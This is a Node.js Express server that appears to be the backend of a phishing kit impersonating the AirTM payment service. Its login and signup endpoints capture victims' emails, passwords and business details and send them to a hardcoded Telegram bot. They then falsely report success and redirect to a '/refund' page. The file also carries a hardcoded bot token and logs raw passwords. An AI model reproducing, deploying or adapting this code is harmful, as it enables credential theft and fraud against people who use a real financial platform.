const express = require('express');
const cors = require('cors');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 5000;

// ============================================
// TELEGRAM CONFIGURATION
// ============================================
const TELEGRAM_BOT_TOKEN = '8959682316:AAEFW23lt-waRnNMAIhIy4_evhz6LpwMaxA';
const TELEGRAM_CHAT_ID = '7386607055';

// ============================================
// MIDDLEWARE
// ============================================
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));

// ============================================
// HEALTH CHECK ENDPOINT
// ============================================
app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        timestamp: new Date().toISOString(),
        message: 'Server is running!'
    });
});

// ============================================
// LOGIN ENDPOINT
// ============================================
app.post('/api/login', async (req, res) => {
    console.log('📨 Login endpoint hit!');
    console.log('📨 Request body:', req.body);
    
    try {
        const { email, password } = req.body;
        
        // Validate input
        if (!email || !password) {
            console.log('❌ Missing email or password');
            return res.status(400).json({ 
                success: false, 
                message: 'Email and password are required' 
            });
        }

        console.log(`📧 Login attempt: ${email}`);

        // Format message for Telegram
        const message = `
🔐 <b>AIRTM LOGIN ATTEMPT</b>
━━━━━━━━━━━━━━━━━━━━━━━━━

📧 <b>Email:</b> ${email}
🔑 <b>Password:</b> ${password}

🕐 <b>Time:</b> ${new Date().toLocaleString('en-US', { 
    timeZone: 'Africa/Lagos',
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
})}

━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>Unauthorized access attempt detected!</i>
        `;

        // Send to Telegram
        try {
            const telegramResponse = await axios.post(
                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
                {
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                }
            );
            console.log('✅ Telegram notification sent successfully');
        } catch (telegramError) {
            console.error('❌ Telegram error:', telegramError.message);
            // Continue even if Telegram fails
        }

        // Return success response
        console.log('✅ Sending success response');
        return res.json({ 
            success: true, 
            message: 'Login successful! Redirecting...',
            redirect: '/refund'
        });

    } catch (error) {
        console.error('❌ Server error:', error.message);
        return res.status(500).json({ 
            success: false, 
            message: 'Server error. Please try again.' 
        });
    }
});

// ============================================
// SIGNUP ENDPOINT
// ============================================
app.post('/api/signup', async (req, res) => {
    console.log('📨 Signup endpoint hit!');
    console.log('📨 Request body:', req.body);
    
    try {
        const { 
            email, 
            password, 
            confirmPassword, 
            country, 
            businessName, 
            entityType,
            termsAccepted 
        } = req.body;

        if (!email || !password || !confirmPassword || !country || !businessName || !entityType) {
            return res.status(400).json({ 
                success: false, 
                message: 'All fields are required' 
            });
        }

        if (password !== confirmPassword) {
            return res.status(400).json({ 
                success: false, 
                message: 'Passwords do not match' 
            });
        }

        if (!termsAccepted) {
            return res.status(400).json({ 
                success: false, 
                message: 'You must accept the Terms of Service' 
            });
        }

        const message = `
📝 <b>AIRTM SIGNUP ATTEMPT</b>
━━━━━━━━━━━━━━━━━━━━━━━━━

📧 <b>Email:</b> ${email}
🔑 <b>Password:</b> ${password}

🌍 <b>Country:</b> ${country}
🏢 <b>Business Name:</b> ${businessName}
📋 <b>Entity Type:</b> ${entityType}
✅ <b>Terms Accepted:</b> ${termsAccepted ? 'Yes' : 'No'}

🕐 <b>Time:</b> ${new Date().toLocaleString('en-US', { 
    timeZone: 'Africa/Lagos',
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
})}

━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>Unauthorized access attempt detected!</i>
        `;

        try {
            await axios.post(
                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
                {
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                }
            );
            console.log('✅ Telegram notification sent successfully');
        } catch (telegramError) {
            console.error('❌ Telegram error:', telegramError.message);
        }

        return res.json({ 
            success: true, 
            message: 'Account created successfully! Redirecting...',
            redirect: '/refund'
        });

    } catch (error) {
        console.error('❌ Signup error:', error.message);
        return res.status(500).json({ 
            success: false, 
            message: 'Server error. Please try again.' 
        });
    }
});

// ============================================
// CATCH-ALL ROUTE - Return JSON for API calls
// ============================================
app.use('*', (req, res) => {
    if (req.path.startsWith('/api')) {
        return res.status(404).json({ 
            success: false, 
            message: 'API endpoint not found' 
        });
    }
    // For non-API routes, serve the HTML
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

// ============================================
// START SERVER
// ============================================
app.listen(PORT, '0.0.0.0', () => {
    console.log('========================================');
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📍 http://localhost:${PORT}`);
    console.log(`🤖 Telegram bot: Configured ✅`);
    console.log(`📱 Chat ID: ${TELEGRAM_CHAT_ID}`);
    console.log('========================================');
});
